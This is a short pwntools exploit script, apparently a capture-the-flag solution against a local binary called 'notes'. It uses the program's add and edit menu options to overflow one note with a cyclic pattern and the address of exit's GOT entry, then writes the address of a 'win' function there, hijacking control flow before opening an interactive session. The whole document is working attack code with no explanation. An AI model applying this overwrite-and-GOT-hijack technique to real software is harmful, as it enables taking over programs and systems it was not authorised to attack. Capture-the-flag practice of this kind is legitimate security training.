from pwn import *

def add(index):
    io.recv()
    io.sendline(b"1")
    io.recvline()
    io.sendline(str(index).encode())
    io.recvline()
    io.sendline(b"AA")

def edit(index, content):
    io.recv()
    io.sendline(b"2")
    io.recvline()
    io.sendline(str(index).encode())
    io.recvline()
    io.sendline(content)

io = process('../../TFC/notes')
elf = context.binary = ELF('../../TFC/notes', checksec=False)
add(0)
add(1)
edit(0, cyclic(32) + pack(elf.got.exit))
edit(1, pack(elf.sym.win))
io.sendline(b'0')
io.interactive()
